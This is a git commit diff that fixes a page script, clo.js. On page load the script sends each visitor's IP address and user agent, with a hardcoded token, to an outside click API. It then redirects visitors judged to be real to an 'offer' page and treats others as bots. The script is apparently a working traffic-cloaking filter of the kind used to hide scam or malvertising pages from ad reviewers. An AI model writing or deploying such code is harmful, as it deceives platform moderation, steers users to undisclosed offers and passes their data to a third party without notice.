2d132e25a1fdfd93e5637b6c81e00eba5c4fb582
taphix <taphix1@gmail.com>
2024-08-02 13:09:06 +0300

    update clo

--- app2/static/clo.js
+++ app2/static/clo.js
@@ -1,4 +1,3 @@
-
 document.addEventListener("DOMContentLoaded", function() {
     makeApiRequest();
 });
@@ -25,12 +24,13 @@ function getQueryParams(params) {
 async function makeApiRequest() {
     const ip = await getIp();
     const userAgent = getUserAgent();
-    const keywordValue = url.searchParams.get("keyword");
+    const currentUrl = window.location.href;
+    const urlObj = new URL(currentUrl);
+    const keywordValue = urlObj.searchParams.get("keyword");
     const token = "pxtshqzgkd5p7fvkrm4rqtcv2cz7czyq";
-    const searchParams = url.search;
-    const url = `https://flyingbalance.icu/click_api/v3?token=${token}&log=1&info=1&ip=${ip}&user_agent=${encodeURIComponent(userAgent)}&keyword=${keyword}`;
+    const apiUrl = `https://flyingbalance.icu/click_api/v3?token=${token}&log=1&info=1&ip=${ip}&user_agent=${encodeURIComponent(userAgent)}&keyword=${keywordValue}`;
 
-    fetch(url)
+    fetch(apiUrl)
         .then(response => response.json())
         .then(data => {
             if (data.info && data.info.url === 'OFFER') {
@@ -40,12 +40,12 @@ async function makeApiRequest() {
                     info: 1,
                     ip: ip,
                     user_agent: userAgent,
-                    keyword: keyword
+                    keyword: keywordValue
                 };
                 const newUrl = `/main?${getQueryParams(params)}`;
                 window.location.href = newUrl;
             } else if (data.info && data.info.url === 'BOT') {
-                console.log("BOT")
+                console.log("BOT");
             }
             hidePreloader();
         })
